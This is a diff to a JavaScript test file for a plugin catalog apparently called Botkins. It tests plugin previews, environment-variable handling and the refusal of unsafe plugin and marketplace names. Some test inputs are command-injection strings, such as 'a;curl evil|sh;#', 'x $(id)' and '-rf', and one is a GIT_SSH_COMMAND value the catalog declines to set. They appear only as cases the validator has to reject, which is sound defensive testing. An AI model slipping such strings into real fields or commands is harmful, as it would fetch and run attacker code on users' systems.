@@ -56,13 +56,22 @@ test("catalog browses a local marketplace and parses components without executin
   const preview = await catalog.preview("memory@test-market");
   assert.match(preview.revision, /^[a-f0-9]{64}$/);
   assert.deepEqual(preview.contents.skills, ["skills/remember/SKILL.md"]);
-  assert.deepEqual(preview.contents.mcpServers, [{ name: "memory", kind: "remote", url: "https://example.test/mcp" }]);
-  assert.deepEqual(preview.contents.hooks, [{ event: "userPromptSubmitted", command: "node \"${PLUGIN_ROOT}/recall.mjs\"" }]);
+  assert.deepEqual(preview.contents.mcpServers, [{ name: "memory", kind: "remote", type: "http", url: "https://example.test/mcp", headers: [{ name: "Authorization", value: "Bearer ${MEMORY_API_KEY}" }] }]);
+  // The fixture's hook has the matcher "*", which means all: the hook runs, so it is shown.
+  assert.deepEqual(preview.contents.hooks, [{ event: "userPromptSubmitted", command: "node \"${PLUGIN_ROOT}/recall.mjs\"", env: [], timeoutSec: 10 }]);
+  assert.equal("notRun" in preview.contents, false);
+  assert.equal(preview.starts, 1, "a preview has the mark of this reading");
+  // The files that are not skills, agents or commands: counted, with the manifest, the tool and hook files and the script.
+  assert.deepEqual(preview.contents.otherFiles.files.map((file) => file.path), [".mcp.json", "hooks/hooks.json", "plugin.json", "recall.mjs"]);
+  assert.equal(preview.contents.otherFiles.count, 4);
+  assert.match(preview.warnings.join(" "), /A command runs with the plugin's own files/);
   assert.deepEqual(preview.config, [{
     key: "MEMORY_API_KEY",
     label: "Memory API key",
     secret: true,
     required: true,
+    // Where the value goes: this header of this tool, at this address.
+    sentTo: [{ tool: "memory", header: "Authorization", url: "https://example.test/mcp" }],
   }]);
   assert.match(preview.warnings.join(" "), /remote MCP/i);
 
@@ -137,4 +146,80 @@ test("live awesome-copilot smoke is opt-in", { skip: !process.env.PLUGIN_CATALOG
   assert.equal(materialized.revision, preview.revision);
   assert.ok(materialized.folder.startsWith(join(await realpath(root), "plugins")));
   assert.equal((await readFile(join(materialized.folder, "skills", "breakdown-epic-arch", "SKILL.md"))).length > 0, true);
+});
+
+test("a preview shows each environment value as written, says which names are not set, and lists only the files that go on", async (t) => {
+  const { plugin } = await fixture(t);
+  await writeFile(join(plugin, ".mcp.json"), JSON.stringify({
+    mcpServers: { local: { command: "node", args: ["--port", 3000], env: { MODE: "fast", GIT_SSH_COMMAND: "sh -c x" }, cwd: "server" } },
+  }));
+  await mkdir(join(plugin, "agents"), { recursive: true });
+  await writeFile(join(plugin, "agents", "a.md"), "A");
+  await writeFile(join(plugin, "agents", "notes.txt"), "not Markdown");
+  const parsed = inspectPlugin(plugin);
+  assert.deepEqual(parsed.contents.mcpServers, [{
+    name: "local", kind: "local", command: "node", args: ["--port", "3000"],
+    env: [{ name: "MODE", value: "fast" }], envNotSet: [{ name: "GIT_SSH_COMMAND", why: "Botkins sets no name that starts with GIT_. Such a name can make a program load or start more than its command says." }], cwd: "server",
+  }]);
+  assert.equal(parsed.warnings.filter((line) => /does not set some environment names/.test(line)).length, 1);
+  assert.deepEqual(parsed.contents.agents, ["agents/a.md"]);
+});
+
+const NAME_REFUSED = /not one word of letters, digits, dots, dashes and underscores, so Botkins does not install it/;
+
+test("a plugin's name is one word: a name that is more than a word is refused at the folder and at the look", async (t) => {
+  const { root, plugin } = await fixture(t);
+  const manifestPath = join(plugin, "plugin.json");
+  const manifest = JSON.parse(await readFile(manifestPath, "utf8"));
+  const refused = ["a;curl evil|sh;#", "x $(id)", "-rf", ".hidden", "two words", "tab\tname", "a".repeat(201), "evil‮name", "line\nbreak", "café"];
+  for (const name of refused) {
+    await writeFile(manifestPath, JSON.stringify({ ...manifest, name }));
+    assert.throws(() => inspectPlugin(plugin), NAME_REFUSED, JSON.stringify(name));
+    await assert.rejects(new PluginCatalog(join(root, "host-refused")).addFolder(plugin), NAME_REFUSED, JSON.stringify(name));
+  }
+  // A missing name keeps its own sentence.
+  await writeFile(manifestPath, JSON.stringify({ ...manifest, name: "   " }));
+  assert.throws(() => inspectPlugin(plugin), /missing a name/);
+  // A refused folder leaves no listing.
+  assert.deepEqual((await new PluginCatalog(join(root, "host-refused")).browse({ marketplace: "folder" })).plugins, []);
+
+  for (const name of ["memory", "my.plugin_2", "A-b", "9lives", "a".repeat(200), "  padded  "]) {
+    await writeFile(manifestPath, JSON.stringify({ ...manifest, name }));
+    const added = await new PluginCatalog(join(root, `host-${name.length}`)).addFolder(plugin);
+    assert.equal(added.preview.name, name.trim());
+    assert.match(added.preview.id, new RegExp(`^${name.trim().replaceAll(".", "\\.")}@folder-[a-f0-9]{12}$`));
+  }
+});
+
+test("a marketplace entry whose name is more than one word is not listed and cannot be previewed", async (t) => {
+  const { root, market } = await fixture(t);
+  await writeFile(join(market, ".github", "plugin", "marketplace.json"), JSON.stringify({
+    name: "market",
+    plugins: [
+      { name: "memory", source: "plugins/memory" },
+      { name: "bad name;x", source: "plugins/memory" },
+      { name: "-rf", source: "plugins/memory" },
+      { name: " padded ", source: "plugins/memory" },
+    ],
+  }));
+  const catalog = new PluginCatalog(join(root, "host-data"));
+  await catalog.addMarketplace(market);
+  assert.deepEqual((await catalog.browse({ marketplace: "market" })).plugins.map((item) => item.id), ["memory@market", "padded@market"]);
+  await assert.rejects(catalog.preview("bad name;x@market"), /Unknown plugin: bad name;x@market/);
+  await assert.rejects(catalog.preview("-rf@market"), /Unknown plugin/);
+  assert.equal((await catalog.preview("memory@market")).id, "memory@market");
+});
+
+test("a marketplace whose own name is more than one word is not added", async (t) => {
+  const { root, market } = await fixture(t);
+  const file = join(market, ".github", "plugin", "marketplace.json");
+  const entries = [{ name: "memory", source: "plugins/memory" }];
+  for (const name of ["m;curl evil|sh", "-x", "two words", "a".repeat(201)]) {
+    await writeFile(file, JSON.stringify({ name, plugins: entries }));
+    const catalog = new PluginCatalog(join(root, "host-data"));
+    await assert.rejects(catalog.addMarketplace(market), /marketplace's name is not one word.*does not add it/, JSON.stringify(name));
+    assert.equal([...catalog.marketplacesById.values()].some((item) => item.source === market), false);
+  }
+  await writeFile(file, JSON.stringify({ name: "good.market_1", plugins: entries }));
+  assert.equal((await new PluginCatalog(join(root, "host-data")).addMarketplace(market)).id, "good.market_1");
 });
